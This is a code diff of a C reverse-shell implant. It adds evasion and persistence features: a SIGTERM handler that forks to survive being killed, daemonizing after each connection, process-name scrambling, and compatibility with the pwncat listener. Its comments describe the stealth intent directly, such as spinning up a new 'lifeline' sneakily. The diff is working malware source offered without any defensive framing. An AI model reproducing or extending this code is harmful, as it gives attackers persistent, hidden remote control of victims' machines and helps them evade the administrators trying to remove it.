@@ -1,6 +1,8 @@
 #define _GNU_SOURCE
 
 #include <arpa/inet.h>
+#include <pthread.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,11 +10,13 @@
 #include <unistd.h>
 
 #include "reverse.h"
+#include "util.h"
 const char *PROC_NET_TCP = "/proc/net/tcp";
 const char *PWNCAT_INIT = " echo; echo ";
 const char *CMD_POSTFIX = " 2>&1";
 
-void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
+void reverse_shell(const char *host, unsigned int port, unsigned int num_shells, int argc,
+                   char *argv[]) {
     int sock;
     char input[256];
     struct sockaddr_in client;
@@ -20,6 +24,9 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
     client.sin_family = AF_INET;
     client.sin_addr.s_addr = inet_addr(host);
     client.sin_port = htons(port);
+
+    // Define a SIGTERM handler to sneakily spin up a new lifeline
+    signal(SIGTERM, sigterm_handler);
 
     while (1) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -40,13 +47,25 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
             }
         }
 
+        // Fork on successful connection, as this shell will now stand out like a sore thumb
+        // TODO; This does mean that new shells are spawned on each reconnect, but I haven't decided
+        // yet whether that's something I want to prevent or whether I can play it off as a feature.
+        // The fix would be to not reconnect after the socket read loop exits
+        if (fork()) {
+            daemon(0, 0);
+            scramble_process_name(argc, argv);
+            continue;
+        }
+
         // Send a message to indicate a socket just connected.
         // Helpful when using a simple `nc` listener
         send(sock, "Connected!\n", strlen("Connected!\n"), 0);
 
         int firstCommand = 1;
         while (read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1) > 0) {
-            // Hacky pwncat compatibility
+            // Hacky pwncat compatibility. pwncat sends an empty echo, followed by an echo with
+            // a random string.
+            // I'm assuming that most users won't chain echo's together like that
             if (firstCommand && strncmp(PWNCAT_INIT, input, strlen(PWNCAT_INIT)) == 0) {
                 // Cut the command at the newline
                 char *enter = strstr(input, "\n");
@@ -99,7 +118,8 @@ void reverse_shell_classic(int sock, char *shell, char *cmd) {
     // Create a fork s.t. one process will be replaced by a shell,
     // while the other one can return to the reconnect loop
     int pid = fork();
-    if (pid != 0) {
+    if (pid == 0) {
+        daemon(0, 0);
         dup2(sock, 0);
         dup2(sock, 1);
         dup2(sock, 2);
@@ -139,4 +159,14 @@ int num_current_connections(const char *host, unsigned int port) {
         i += 1;
     }
     return occurrences;
+}
+
+// On Sigterm --> Fork and continue under a new PID
+void sigterm_handler(int signal) {
+    if (fork() == 0) {
+        daemon(0, 0);
+        return;
+    }
+    // Let PID that receive the sigterm exit
+    exit(0);
 }
